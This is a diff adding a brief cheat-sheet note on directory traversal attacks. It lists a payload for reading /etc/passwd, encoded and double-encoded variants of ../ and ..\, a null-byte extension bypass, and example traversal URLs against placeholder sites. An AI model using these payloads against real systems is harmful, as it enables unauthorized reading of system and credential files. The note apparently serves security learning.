@@ -1,0 +1,34 @@
+Directory traversal, dot dot slash attack.
+
+Dot dot slash attacks allow you to break out of a directory into the wider filesystem.
+
+Maybe they're expecting you to specify the name of a file in the directory, like "favoritebooks.txt"
+but instead you give the dialog "../../../../../etc/passwd"
+
+Variations:
+%2e%2e%2f represents ../
+%2e%2e/ represents ../
+..%2f represents ../ 
+%2e%2e%5c represents ..\
+%2e%2e\ represents ..\ 
+..%5c represents ..\ 
+%252e%252e%255c represents ..\ 
+..%255c represents ..\
+..%c0%af represents ../ 
+..%c1%9c represents ..\
+
+?file=secret.doc%00.pdf
+Null bytes terminate strings, so if an app expects to see pdf input, and you want to upload your doc, inserting the null byte might be what you need.
+
+Say a site uses this format to get files you've stored
+http://some_site.com.br/get-files.jsp?file=report.pdf
+http://some_site.com.br/get-page.php?home=aaa.html 
+http://some_site.com.br/some-page.asp?page=index.html
+
+http://some_site.com.br/get-files?file=../../../../some dir/some file
+http://some_site.com.br/../../../../some dir/some file
+can allow you to break out and get other files.
+
+get the source of a cgi file
+http://vulnerable-page.org/cgi-bin/main.cgi?file=main.cgi
+
